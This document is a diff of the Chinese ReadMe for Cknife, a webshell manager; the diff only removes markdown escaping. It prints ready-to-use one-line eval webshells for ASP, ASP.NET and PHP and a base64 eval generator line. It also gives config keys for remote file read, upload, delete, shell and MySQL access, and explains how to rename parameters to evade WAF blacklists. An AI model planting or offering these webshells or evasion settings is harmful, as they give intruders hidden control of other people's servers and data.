@@ -46,22 +46,22 @@ ReadMe.txt	你现在正在看的(可删除)
 三、使用说明：
 
 服务端脚本支持ASP、ASPX、PHP、JSP、JSPX、Customize(自定义)。
-代码包含且不限于如下代码（只要能构造出类似eval的函数就行，比如PHP的create\_function、assert等）
+代码包含且不限于如下代码（只要能构造出类似eval的函数就行，比如PHP的create_function、assert等）
 
 ASP:        
 <%eval request("Cknife")%>
 　	
 ASP.NET:    
-<%@ Page Language="Jscript"%><%eval(Request.Item\["Cknife"\],"unsafe");%>
+<%@ Page Language="Jscript"%><%eval(Request.Item["Cknife"],"unsafe");%>
 
 PHP:        
-<?php @eval($\_POST\['Cknife'\]);?>
+<?php @eval($_POST['Cknife']);?>
 
 JSP:	    
-\[代码详见1.jsp\]
+[代码详见1.jsp]
 
 JSPX:	    
-\[代码详见1.jspx\]
+[代码详见1.jspx]
 
 Customize:  
 自定义类型,功能代码在服务端保存,理论上支持所有动态脚本,只要正确与C刀进行交互即可。此模式可按需定制，比如只要浏览目录，或是只要虚拟终端功能，代码可以很简短。
@@ -94,22 +94,22 @@ CODE=code         			       编码参数
 ACTION=action    			       动作参数 
 PARAM1=z1         			       参数1 
 PARAM2=z2         			       参数2 
-PHP\_BASE64=1   				       当为PHP时，Z1，Z2参数是否开启自动base64加密，如果想定义自己的加密方式则关闭设置为0 
-PHP\_MAKE=@eval(base64\_decode($\_POST\[action\])); 生成方式，这里可以不用该方式，可以用你任何想要的方式 
-PHP\_INDEX=...             		       显示主页功能的代码放这儿
-PHP\_READDICT=...      			       读取主页功能的代码放这儿
-PHP\_READFILE=...       			       读取文件功能的代码放这儿
-PHP\_DELETE=...           		       删除文件夹以及文件功能的代码放这儿
-PHP\_RENAME=...         			       重命名文件夹以及文件功能的代码放这儿
-PHP\_RETIME=...         			       修改时间功能的代码放这儿
-PHP\_NEWDICT=...        			       新建目录功能的代码放这儿
-PHP\_UPLOAD=...          		       上传文件功能的代码放这儿
-PHP\_DOWNLOAD=...    			       下载文件功能的代码放这儿
-PHP\_SHELL=...              		       虚拟终端功能的代码放这儿
-PHP\_DB\_MYSQL=...			       管理MYSQL数据库功能的代码放这儿
-ASP\_...=...
-ASPX\_...=...
-JSP\_...=...
+PHP_BASE64=1   				       当为PHP时，Z1，Z2参数是否开启自动base64加密，如果想定义自己的加密方式则关闭设置为0 
+PHP_MAKE=@eval(base64_decode($_POST[action])); 生成方式，这里可以不用该方式，可以用你任何想要的方式 
+PHP_INDEX=...             		       显示主页功能的代码放这儿
+PHP_READDICT=...      			       读取主页功能的代码放这儿
+PHP_READFILE=...       			       读取文件功能的代码放这儿
+PHP_DELETE=...           		       删除文件夹以及文件功能的代码放这儿
+PHP_RENAME=...         			       重命名文件夹以及文件功能的代码放这儿
+PHP_RETIME=...         			       修改时间功能的代码放这儿
+PHP_NEWDICT=...        			       新建目录功能的代码放这儿
+PHP_UPLOAD=...          		       上传文件功能的代码放这儿
+PHP_DOWNLOAD=...    			       下载文件功能的代码放这儿
+PHP_SHELL=...              		       虚拟终端功能的代码放这儿
+PHP_DB_MYSQL=...			       管理MYSQL数据库功能的代码放这儿
+ASP_...=...
+ASPX_...=...
+JSP_...=...
 
 除了修改以上参数过WAF外，程序还额外提供了一种Customize过WAF的模式。
 Customize模式原本是用于支持一些程序默认不支持的脚本，比如CFM、ASMX、ASHX、PY等等，只要用户自写的脚本能正确与菜刀进行交互即可。
@@ -121,18 +121,18 @@ Customize模式原本是用于支持一些程序默认不支持的脚本，比�
 Customize(自定义)模式跟其他模式一样，每一个步骤也都写入到配置文件里面，用户同样可以参数名称以及参数内容。
 比如你自写了用Customize模式连接的Customize.php服务端。显示主页功能提交的参数应该是：密码=1&action=index以及密码=1&action=readdict。
 如果C刀普及以后WAF厂商肯定会把readdict列入黑名单，这个时候你就可以修改readdict的名称为其他名称，同样可以修改action的名称，也可以修改1为其他字符
-CUS\_MAKE=1 
-CUS\_INDEX=index 
-CUS\_READDICT=readdict 
-CUS\_READFILE=readfile 
-CUS\_SAVEFILE=savefile 
-CUS\_DELETE=delete 
-CUS\_RENAME=rename 
-CUS\_RETIME=retime 
-CUS\_NEWDICT=newdict 
-CUS\_UPLOAD=upload 
-CUS\_DOWNLOAD=download 
-CUS\_SHELL=shell
+CUS_MAKE=1 
+CUS_INDEX=index 
+CUS_READDICT=readdict 
+CUS_READFILE=readfile 
+CUS_SAVEFILE=savefile 
+CUS_DELETE=delete 
+CUS_RENAME=rename 
+CUS_RETIME=retime 
+CUS_NEWDICT=newdict 
+CUS_UPLOAD=upload 
+CUS_DOWNLOAD=download 
+CUS_SHELL=shell
 
 七、更新日志：(更新版本后请删除Config.ini文件，重新打开自动生成新版本的Config.ini)
 
@@ -179,7 +179,7 @@ Graphite与Metal类型的皮肤互相之间切换不需要重启Cknife，其余�
 
 20160426
 1、修复JSP连接MYSQL数据库异常的问题
-2、虚拟终端增加自定义Cmd路径的功能，命令为setp \[path\]
+2、虚拟终端增加自定义Cmd路径的功能，命令为setp [path]
 
 20160413
 1、添加自定义模式shell返回路径的自定义分隔符
@@ -217,5 +217,5 @@ Graphite与Metal类型的皮肤互相之间切换不需要重启Cknife，其余�
 1、连接失败返回详细信息，方便用户分析问题
 
 20160301
-1、合并Cknife与Cknife\_Skin
+1、合并Cknife与Cknife_Skin
 2、添加数据库功能，添加PHP对MYSQL的支持
